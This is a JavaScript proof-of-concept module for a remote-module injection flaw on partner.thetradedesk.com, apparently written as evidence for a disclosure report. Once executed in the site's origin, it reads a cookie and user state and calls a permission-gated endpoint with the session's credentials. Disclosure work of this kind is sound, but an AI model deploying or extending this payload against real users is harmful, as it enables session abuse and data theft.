// PoC — partner.thetradedesk.com, AFE remote-module injection.
// Serve as: Content-Type: application/javascript,  Access-Control-Allow-Origin: *
// Read-only. Performs no mutation. Exfiltrates no cookies and no tokens.
//
// This module prints one structured block to the console. Each numbered line is the
// evidence for the correspondingly numbered claim in the report.

const line = (n, label, value) =>
  console.log(`[${n}] ${label.padEnd(34, ".")}: ${value}`);

console.log("=== PoC: partner.thetradedesk.com — AFE remote-module injection ===");

// [1] Attacker-controlled input: the URL parameter and/or the cookie.
const qp = new URLSearchParams(location.search);
const paramInputs = [...qp.entries()]
  .filter(([k]) => /-(version|sha)$/.test(k) || k === "devServer")
  .map(([k, v]) => `${k}=${v}`);
const cookieInput = (document.cookie.split("; ").find(c => c.startsWith("cdnPath=")) || "(none)");
line(1, "attacker-controlled parameter", paramInputs.length ? paramInputs.join(" , ") : "(none)");
line(1, "attacker-controlled cookie", cookieInput);

// [2] Client-side processing: the loader turned that input into a module URL.
// [3] Execution path: this file was fetched and evaluated by the dynamic import() in
//     AfeBaseComponent.importPathWithOriginList(). import.meta.url is the URL it resolved to.
line(2, "resolved module URL", import.meta.url);
line(3, "loaded via", "dynamic import() (ES module) — document.currentScript is " + document.currentScript);
line(3, "AFE loader registry", Object.keys(window.__TTD_AFES || {}).join(", ") || "(empty)");

// [4] Arbitrary JavaScript execution: this code is running and can compute freely.
const marker = "PoC-" + Math.random().toString(36).slice(2, 10);
line(4, "arbitrary JS executed, marker", marker + " @ " + new Date().toISOString());

// [5] The origin it is running in.
line(5, "location.origin", location.origin);
line(5, "location.href", location.href);
line(5, "document.baseURI", document.baseURI);

// [6] Same-origin JavaScript state is readable by this code.
//     Anonymous run: these are present but empty. A signed-in victim has them populated.
line(6, "window.UserInfo", JSON.stringify(window.UserInfo));
line(6, "window.UserPermissions", JSON.stringify(window.UserPermissions));
line(6, "window.SignedIn", String(window.SignedIn));

// [7] Reachability of a permission-gated endpoint.
//     IMPORTANT: the status below is the server's authorization decision for THIS session.
//     403 means the current session is NOT privileged. It documents reachability only and
//     must not be read as privileged access. A session holding
//     PublicAPI_Documentation_Preview_InternalOnly is expected to receive 200 + branch list.
const PRIVILEGED_READ = "/v3/portalapi/GetPreviewBranches";
try {
  const r = await fetch(PRIVILEGED_READ, {
    credentials: "same-origin",
    headers: { Accept: "application/json" }
  });
  const body = (await r.text()).slice(0, 240);
  line(7, "GET " + PRIVILEGED_READ, "HTTP " + r.status);
  line(7, "response body (truncated)", body);
  line(7, "interpretation", r.status === 200
    ? "PRIVILEGED response — chain complete for this session"
    : "NOT privileged (" + r.status + ") — reachability only, not privileged access");
} catch (e) {
  line(7, "GET " + PRIVILEGED_READ, "request failed: " + String(e).slice(0, 120));
}

console.log("=== end of PoC ===");

// Keep the loader contract satisfied so the host app does not error out.
export const versions = ["9.9.9"];
export const Component = () => null;
export default {};
